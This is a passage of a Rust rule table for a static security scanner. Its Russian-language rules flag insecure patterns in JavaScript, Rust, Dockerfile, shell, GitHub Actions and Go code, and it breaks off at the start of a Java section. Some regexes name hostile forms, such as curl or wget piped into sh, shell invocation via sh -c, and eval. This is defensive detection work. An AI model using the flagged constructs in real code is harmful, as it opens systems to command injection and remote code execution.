        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-018",
        title: "CORS: разрешены все источники",
        description: "origin \"*\" разрешает любому сайту читать ответы вашего API. В связке с credentials:true это позволяет чужой странице действовать от имени залогиненного пользователя.",
        recommendation: "Задайте белый список доменов. Origin \"*\" и credentials:true несовместимы — браузер отклонит такую комбинацию.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: JS_FAMILY,
        pattern: r#"(?i)origin\s*:\s*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-942", "CWE-346"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/942.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-019",
        title: "postMessage с целевым источником *",
        description: "Указание \"*\" отправляет сообщение любому окну, которое сейчас загружено во фрейм. Если там чужой сайт, он прочитает данные.",
        recommendation: "Передавайте конкретный origin: target.postMessage(data, \"https://app.example.com\"). На приёме проверяйте event.origin.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Утечка данных",
        languages: JS_FAMILY,
        pattern: r#"postMessage\s*\([^)]*,\s*["']\*["']"#,
        unless_contains: &[],
        cwe: &["CWE-346"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/346.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-020",
        title: "Открытый редирект из пользовательских данных",
        description: "Редирект по адресу из запроса позволяет увести пользователя на фишинговый сайт по ссылке с вашего домена.",
        recommendation: "Редиректьте только на относительные пути или адреса из белого списка. Проверяйте, что URL начинается с \"/\" и не с \"//\".",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Открытый редирект",
        languages: JS_FAMILY,
        pattern: r"res\.redirect\s*\(\s*req\.(?:query|params|body)",
        unless_contains: &[],
        cwe: &["CWE-601"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/601.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-021",
        title: "Path traversal: путь из пользовательских данных",
        description: "Склейка пути с данными запроса позволяет выйти за пределы каталога через ../ и прочитать произвольные файлы.",
        recommendation: "Нормализуйте путь через path.resolve() и проверьте, что результат начинается с разрешённого каталога. Лучше — path.basename() для имени файла.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: JS_FAMILY,
        pattern: r"(?:readFile|readFileSync|createReadStream|sendFile|writeFile|writeFileSync|unlink)\s*\([^)]*req\.(?:query|params|body)",
        unless_contains: &["basename", "resolve"],
        cwe: &["CWE-22"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/22.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-022",
        title: "setTimeout/setInterval со строкой вместо функции",
        description: "Если первым аргументом передана строка, она исполняется как код — это скрытый eval.",
        recommendation: "Передавайте функцию: setTimeout(() => doWork(), 100).",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Выполнение кода",
        languages: JS_FAMILY,
        pattern: r#"set(?:Timeout|Interval)\s*\(\s*["'`]"#,
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-023",
        title: "target=\"_blank\" без rel=\"noopener\"",
        description: "Открытая вкладка получает доступ к window.opener и может подменить исходную страницу на фишинговую (reverse tabnabbing).",
        recommendation: "Добавьте rel=\"noopener noreferrer\". Современные браузеры делают это сами, но старые — нет.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: JS_FAMILY,
        pattern: r#"target\s*=\s*["'{]?_blank"#,
        unless_contains: &["noopener", "noreferrer"],
        cwe: &["CWE-1022"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/1022.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-024",
        title: "Токен хранится в localStorage",
        description: "localStorage доступен любому скрипту на странице. Одна XSS — и токен утёк. В отличие от cookie, флаг HttpOnly здесь недоступен.",
        recommendation: "Храните токен в cookie с HttpOnly, Secure и SameSite=Strict. Так его не прочитает JavaScript.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Хранение секретов",
        languages: JS_FAMILY,
        pattern: r#"localStorage\.setItem\s*\(\s*["'][^"']*(?:token|jwt|auth|secret|password|session|apikey|api_key)"#,
        unless_contains: &[],
        cwe: &["CWE-522", "CWE-922"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/922.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-025",
        title: "Cookie без флагов httpOnly / secure",
        description: "Без httpOnly cookie читается скриптом при XSS, без secure — уходит по открытому HTTP и перехватывается в сети.",
        recommendation: "Ставьте { httpOnly: true, secure: true, sameSite: \"strict\" } для всех сессионных cookie.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Конфигурация",
        languages: JS_FAMILY,
        pattern: r"httpOnly\s*:\s*false|secure\s*:\s*false",
        unless_contains: &[],
        cwe: &["CWE-1004", "CWE-614"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/1004.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-026",
        title: "Небезопасная десериализация через node-serialize",
        description: "unserialize() в node-serialize исполняет функции, закодированные в данных. Это известный вектор RCE.",
        recommendation: "Используйте JSON.parse(). Библиотеку node-serialize применять для недоверенных данных нельзя.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: JS_FAMILY,
        pattern: r"(?:node-serialize|serialize)\.unserialize\s*\(",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/502.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-027",
        title: "Модуль vm не является песочницей",
        description: "vm.runInNewContext() не изолирует код: через конструкторы и прототипы из него можно выбраться в основной контекст процесса.",
        recommendation: "Для недоверенного кода используйте отдельный процесс с ограничениями или изолированную среду (isolated-vm, WebAssembly).",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: JS_FAMILY,
        pattern: r"vm\.(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-94", "CWE-265"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://nodejs.org/api/vm.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-028",
        title: "Регулярное выражение с риском катастрофического бэктрекинга (ReDoS)",
        description: "Вложенные квантификаторы вида (a+)+ на специально подобранной строке приводят к экспоненциальному времени разбора и блокируют event loop.",
        recommendation: "Упростите выражение, уберите вложенные квантификаторы. Ограничьте длину входа или используйте RE2-совместимый движок.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Отказ в обслуживании",
        languages: JS_FAMILY,
        pattern: r"\([^)]*[+*]\)[+*]",
        unless_contains: &[],
        cwe: &["CWE-1333", "CWE-400"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/1333.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-029",
        title: "NoSQL-инъекция через $where",
        description: "Оператор $where в MongoDB выполняет JavaScript на сервере БД. Данные пользователя в его значении дают инъекцию кода и обход фильтров запроса.",
        recommendation: "Не используйте $where. Стройте условия обычными операторами ($eq, $in) и приводите типы параметров запроса.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: JS_FAMILY,
        pattern: r#"["']?\$where["']?\s*:"#,
        unless_contains: &[],
        cwe: &["CWE-943"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/943.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------------ Rust
    Rule {
        id: "VS-RS-001",
        title: "Блок unsafe",
        description: "В unsafe компилятор не проверяет корректность работы с памятью. Ошибка здесь — это UB: порча памяти, эксплуатируемые падения.",
        recommendation: "Проверьте, что инварианты действительно соблюдены, и опишите их в комментарии // SAFETY:. По возможности замените безопасным аналогом.",
        severity: Severity::Info,
        confidence: Confidence::High,
        category: "Безопасность памяти",
        languages: RS,
        pattern: r"\bunsafe\s*\{",
        unless_contains: &[],
        cwe: &["CWE-119"],
        owasp: None,
        references: &["https://doc.rust-lang.org/nomicon/"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RS-002",
        title: "std::mem::transmute",
        description: "transmute переинтерпретирует байты одного типа как другой без каких-либо проверок. Несовпадение размера или инвариантов типа — мгновенное UB.",
        recommendation: "Используйте безопасные преобразования: as для чисел, from_le_bytes для байтов, крейты bytemuck/zerocopy для POD-типов.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Безопасность памяти",
        languages: RS,
        pattern: r"(?:std::)?mem::transmute\s*(?:::<[^>]*>)?\s*\(",
        unless_contains: &[],
        cwe: &["CWE-704"],
        owasp: None,
        references: &["https://doc.rust-lang.org/std/mem/fn.transmute.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RS-003",
        title: "from_utf8_unchecked без проверки",
        description: "Функция создаёт &str из байтов, не проверяя UTF-8. Невалидные байты ломают инвариант str и приводят к UB при дальнейшей работе со строкой.",
        recommendation: "Используйте std::str::from_utf8(bytes)? и обработайте ошибку, либо String::from_utf8_lossy() для «best effort».",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Безопасность памяти",
        languages: RS,
        pattern: r"from_utf8_unchecked\s*\(",
        unless_contains: &[],
        cwe: &["CWE-20"],
        owasp: None,
        references: &["https://doc.rust-lang.org/std/str/fn.from_utf8_unchecked.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RS-004",
        title: "get_unchecked — доступ без проверки границ",
        description: "Метод читает элемент без проверки индекса. Выход за границы даёт чтение чужой памяти или падение — это UB, а не паника.",
        recommendation: "Используйте обычную индексацию или .get(i), который вернёт Option. Оптимизация оправдана только на измеренном горячем пути.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Безопасность памяти",
        languages: RS,
        pattern: r"get_unchecked(?:_mut)?\s*\(",
        unless_contains: &[],
        cwe: &["CWE-125", "CWE-787"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/125.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RS-005",
        title: "Команда запускается через шелл (sh -c / cmd /C)",
        description: "Передача строки в sh -c возвращает разбор метасимволов шеллу. Пользовательские данные в такой строке дают инъекцию команд.",
        recommendation: "Вызывайте программу напрямую: Command::new(\"git\").arg(\"log\").arg(&branch) — аргументы передаются как есть, без шелла.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: RS,
        pattern: r#"Command::new\s*\(\s*["'](?:sh|bash|zsh|cmd|powershell|/bin/sh|/bin/bash)["']"#,
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RS-006",
        title: "reqwest принимает недействительные сертификаты",
        description: "danger_accept_invalid_certs(true) отключает проверку сертификата. Соединение больше не защищено от man-in-the-middle.",
        recommendation: "Уберите опцию. Для внутреннего CA добавьте корневой сертификат: .add_root_certificate(Certificate::from_pem(&pem)?).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: RS,
        pattern: r"danger_accept_invalid_(?:certs|hostnames)\s*\(\s*true\s*\)",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RS-007",
        title: "SQL-запрос собирается format!",
        description: "format! не экранирует кавычки, поэтому подстановка пользовательских данных в текст SQL приводит к инъекции.",
        recommendation: "Используйте параметры драйвера: sqlx::query(\"SELECT * FROM t WHERE id = $1\").bind(id) или query! с проверкой на этапе компиляции.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: RS,
        pattern: r#"(?i)format!\s*\(\s*["'][^"']*(?:select |insert |update |delete |drop )"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-RS-008",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 уязвимы к коллизиям и не годятся для подписей и проверки целостности.",
        recommendation: "Используйте sha2::Sha256 или blake3. Для паролей — argon2 или bcrypt.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: RS,
        pattern: r"\b(?:Md5|Sha1)::new\s*\(\s*\)|md5::compute\s*\(",
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RS-009",
        title: "unwrap() на результате разбора внешних данных",
        description: "unwrap() на данных извне (переменные окружения, парсинг ввода, сеть) превращает некорректный вход в панику. Для сервиса это отказ в обслуживании.",
        recommendation: "Обработайте ошибку: ? с anyhow/thiserror, либо .unwrap_or_default() / .context(\"...\") с понятным сообщением.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Обработка ошибок",
        languages: RS,
        pattern: r"(?:env::var|from_str|parse|from_utf8|read_to_string|recv|accept)\s*(?:::<[^>]*>)?\s*\([^)]*\)\s*\.\s*unwrap\s*\(\s*\)",
        unless_contains: &[],
        cwe: &["CWE-248"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/248.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-RS-010",
        title: "Арифметика без контроля переполнения",
        description: "В release-сборке переполнение целого молча заворачивается по модулю. В расчётах размеров, индексов и балансов это приводит к логическим ошибкам и порче памяти.",
        recommendation: "Используйте checked_add/checked_mul и обрабатывайте None, либо saturating_/wrapping_ варианты, если поведение задумано.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Целочисленное переполнение",
        languages: RS,
        pattern: r"\bas\s+(?:u8|u16|u32|usize|i8|i16|i32)\b",
        unless_contains: &[],
        cwe: &["CWE-190"],
        owasp: None,
        references: &["https://cwe.mitre.org/data/definitions/190.html"],
        skip_in_tests: true,
    },

    // ------------------------------------------------------------ Dockerfile
    Rule {
        id: "VS-DK-001",
        title: "Контейнер работает от root",
        description: "Без директивы USER процесс в контейнере идёт от root. При побеге из контейнера или монтировании томов это заметно повышает ущерб.",
        recommendation: "Добавьте непривилегированного пользователя: RUN adduser -D app && USER app.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*USER\s+root",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/250.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-002",
        title: "Скачивание скрипта и запуск через пайп",
        description: "curl | sh выполняет всё, что вернёт сервер, без проверки. Компрометация источника или MITM означают выполнение произвольного кода при сборке.",
        recommendation: "Скачайте файл, проверьте контрольную сумму или подпись, и только потом запускайте.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile, Language::Shell],
        pattern: r"(?:curl|wget)[^\n|]*\|\s*(?:sudo\s+)?(?:ba)?sh",
        unless_contains: &[],
        cwe: &["CWE-494"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/494.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-003",
        title: "Загрузка с отключённой проверкой сертификата",
        description: "Флаги --no-check-certificate и --insecure отключают проверку TLS при скачивании — содержимое можно подменить по пути.",
        recommendation: "Уберите флаг. Если мешает корпоративный CA, установите его сертификат в образ.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile, Language::Shell],
        pattern: r"--no-check-certificate|curl[^\n]*\s-[a-zA-Z]*k\b|--insecure",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-004",
        title: "Базовый образ с тегом latest",
        description: "latest не фиксирует версию: сборка невоспроизводима, а обновление базового образа может незаметно втянуть уязвимость.",
        recommendation: "Фиксируйте версию, а лучше digest: FROM node:22.13-alpine@sha256:...",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*FROM\s+\S+:latest",
        unless_contains: &[],
        cwe: &["CWE-1104"],
        owasp: Some(OWASP_VULN_COMP),
        references: &["https://cwe.mitre.org/data/definitions/1104.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-005",
        title: "ADD с удалённым URL",
        description: "ADD с http(s)-адресом скачивает файл при сборке без проверки контрольной суммы. Подмена источника или MITM втягивают чужое содержимое в образ.",
        recommendation: "Скачивайте через RUN curl с проверкой суммы, а для локальных файлов используйте COPY — ADD с URL непрозрачен.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Цепочка поставок",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*ADD\s+https?://",
        unless_contains: &[],
        cwe: &["CWE-494"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://docs.docker.com/reference/dockerfile/#add"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-DK-006",
        title: "Секрет задан в ENV/ARG",
        description: "Значение ENV или ARG остаётся в слоях образа и в истории сборки. Пароль или токен, заданный так, достанет любой, у кого есть образ.",
        recommendation: "Пробрасывайте секреты через RUN --mount=type=secret или переменные окружения при запуске, а не в Dockerfile.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Хранение секретов",
        languages: &[Language::Dockerfile],
        pattern: r"(?mi)^\s*(?:ENV|ARG)\s+\w*(?:PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|ACCESS_?KEY|PRIVATE_?KEY)\w*(?:\s*=\s*|\s+)\S",
        unless_contains: &[],
        cwe: &["CWE-798"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/798.html"],
        skip_in_tests: false,
    },

    // ----------------------------------------------------------- Shell / CI
    Rule {
        id: "VS-SH-001",
        title: "eval в shell-скрипте",
        description: "eval исполняет собранную строку как команду. Любая переменная внутри неё, пришедшая извне, даёт инъекцию.",
        recommendation: "Избегайте eval. Используйте массивы аргументов и \"${var}\" в кавычках.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Shell],
        pattern: r"(?m)^\s*eval\s+",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SH-002",
        title: "Права 0777 через chmod",
        description: "chmod 777 даёт чтение, запись и исполнение любому пользователю. Локальный злоумышленник сможет подменить содержимое файла или скрипта.",
        recommendation: "Задавайте минимально необходимые права: 0644 для файлов, 0755 для исполняемых, 0600 для секретов.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Shell, Language::Dockerfile],
        pattern: r"(?i)chmod\s+(?:-R\s+)?0?777\b",
        unless_contains: &[],
        cwe: &["CWE-276"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/276.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-001",
        title: "GitHub Actions: pull_request_target",
        description: "Этот триггер даёт workflow доступ к секретам репозитория и выполняется в контексте базовой ветки. В связке с checkout кода из PR любой внешний контрибьютор может украсть секреты.",
        recommendation: "Используйте обычный pull_request. Если нужен именно pull_request_target — не делайте checkout кода из PR и не запускайте его сборку.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Цепочка поставок",
        languages: &[Language::Yaml],
        pattern: r"(?m)^\s*pull_request_target\s*:",
        unless_contains: &[],
        cwe: &["CWE-269"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-002",
        title: "GitHub Actions: сторонний action не зафиксирован по SHA",
        description: "Ссылка на тег или ветку означает, что владелец action может в любой момент подменить код, который выполняется с вашими секретами.",
        recommendation: "Фиксируйте action по полному SHA коммита: uses: actions/checkout@8f4b7f8... — тег можно оставить комментарием.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Цепочка поставок",
        languages: &[Language::Yaml],
        pattern: r"(?m)uses\s*:\s*[\w.-]+/[\w.-]+@v?[\d.]+\s*$",
        unless_contains: &[],
        cwe: &["CWE-1357"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-003",
        title: "GitHub Actions: инъекция в run через выражение",
        description: "Подстановка ${{ github.event.*.title/body }} или github.head_ref прямо в run вставляет подконтрольный атакующему текст в шелл-скрипт шага — это инъекция команд в раннер.",
        recommendation: "Передавайте значение через env: и обращайтесь к нему как \"$VAR\" в кавычках — тогда подстановка не парсится шеллом.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Yaml],
        pattern: r"\$\{\{\s*github\.(?:event\.[\w.]*(?:title|body|message|email)|head_ref)\b",
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://securitylab.github.com/resources/github-actions-untrusted-input/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-CI-004",
        title: "GitHub Actions: permissions write-all",
        description: "write-all выдаёт токену workflow права на запись во все области, включая содержимое репозитория. Скомпрометированный шаг сможет пушить код и менять релизы.",
        recommendation: "Задайте минимальные права явно: permissions: { contents: read } на уровне workflow, расширяя точечно там, где нужно.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Yaml],
        pattern: r"(?mi)^\s*permissions:\s*write-all\b",
        unless_contains: &[],
        cwe: &["CWE-269"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.github.com/en/actions/security-guides/automatic-token-authentication"],
        skip_in_tests: false,
    },

    // -------------------------------------------------------------------- Go
    Rule {
        id: "VS-GO-001",
        title: "Команда запускается через шелл",
        description: "exec.Command(\"sh\", \"-c\", ...) отдаёт разбор строки шеллу, поэтому метасимволы в аргументах интерпретируются. Пользовательский ввод даёт инъекцию команд.",
        recommendation: "Вызывайте программу напрямую: exec.Command(\"git\", \"log\", branch) — аргументы передаются как есть, без шелла.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Инъекция команд",
        languages: &[Language::Go],
        pattern: r#"exec\.Command\s*\(\s*["'](?:sh|bash|zsh|cmd|powershell|/bin/sh|/bin/bash)["']"#,
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-002",
        title: "SQL-запрос собирается конкатенацией или Sprintf",
        description: "Склейка значений с текстом SQL не экранирует кавычки, поэтому пользовательский ввод может изменить структуру запроса.",
        recommendation: "Используйте плейсхолдеры драйвера: db.Query(\"SELECT * FROM t WHERE id = $1\", id).",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: &[Language::Go],
        pattern: r#"(?i)(?:Query|Exec|QueryRow)\s*\(\s*(?:fmt\.Sprintf\s*\(\s*)?["`][^"`]*(?:select |insert |update |delete |drop )"#,
        unless_contains: &["$1", "?", "$2"],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-003",
        title: "Отключена проверка TLS-сертификата",
        description: "InsecureSkipVerify: true заставляет клиент принимать любой сертификат. Соединение перестаёт защищать от man-in-the-middle.",
        recommendation: "Уберите опцию. Для внутреннего CA добавьте его в RootCAs пула сертификатов.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Go],
        pattern: r"InsecureSkipVerify\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-004",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 уязвимы к коллизиям и не годятся для подписей и проверки целостности.",
        recommendation: "Используйте sha256.New(). Для паролей — golang.org/x/crypto/bcrypt или argon2.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: &[Language::Go],
        pattern: r"(?:md5|sha1)\.(?:New|Sum)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-GO-005",
        title: "Ошибка игнорируется присваиванием в _",
        description: "Go возвращает ошибки значением. Присваивание в _ отбрасывает её молча, и код продолжает работать с неинициализированными данными.",
        recommendation: "Обработайте ошибку: if err != nil { return fmt.Errorf(\"...: %w\", err) }.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Обработка ошибок",
        languages: &[Language::Go],
        pattern: r"(?m)^\s*_,\s*_\s*(?::)?=\s*\w+",
        unless_contains: &[],
        cwe: &["CWE-390"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/390.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-GO-006",
        title: "Слабый генератор случайных чисел",
        description: "math/rand — предсказуемый PRNG. Токены и ключи, полученные из него, восстанавливаются по нескольким значениям.",
        recommendation: "Для всего, что связано с безопасностью, используйте crypto/rand.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: &[Language::Go],
        pattern: r#"math/rand"|rand\.(?:Intn|Int31|Int63|Float64)\s*\("#,
        unless_contains: &["crypto/rand"],
        cwe: &["CWE-338"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/338.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-GO-007",
        title: "Слабый шифр (DES/RC4)",
        description: "DES с 56-битным ключом перебирается, а поток RC4 имеет статистические смещения. Оба алгоритма считаются сломанными.",
        recommendation: "Используйте AES-GCM через crypto/aes и crypto/cipher со случайным nonce на каждое сообщение.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: &[Language::Go],
        pattern: r"(?:des|rc4)\.NewCipher\s*\(",
        unless_contains: &[],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-GO-008",
        title: "Приведение к template.HTML отключает экранирование",
        description: "Значения типов template.HTML/JS/URL вставляются в шаблон без автоэкранирования. Если в них попадает пользовательский ввод, это XSS.",
        recommendation: "Не приводите пользовательские данные к template.HTML. Пусть html/template экранирует их сам, передавая как обычную строку.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XSS",
        languages: &[Language::Go],
        pattern: r"\btemplate\.(?:HTML|JS|URL|CSS)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-GO-009",
        title: "Файл создаётся с правами 0777",
        description: "Права 0777 дают чтение, запись и исполнение любому пользователю системы. Локальный злоумышленник сможет подменить содержимое файла.",
        recommendation: "Задавайте минимально необходимые права: 0600 для приватных файлов, 0644 для читаемых, 0700 для каталогов.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Go],
        pattern: r"(?:Chmod|MkdirAll|WriteFile|OpenFile|Mkdir)\s*\([^)]*0o?777",
        unless_contains: &[],
        cwe: &["CWE-276"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/276.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-GO-010",
        title: "SSH: проверка ключа хоста отключена",
        description: "ssh.InsecureIgnoreHostKey принимает любой ключ сервера. Соединение перестаёт защищать от man-in-the-middle.",
        recommendation: "Используйте ssh.FixedHostKey или knownhosts.New с заранее известными ключами хостов.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::Go],
        pattern: r"ssh\.InsecureIgnoreHostKey\b",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------------ Java
    Rule {
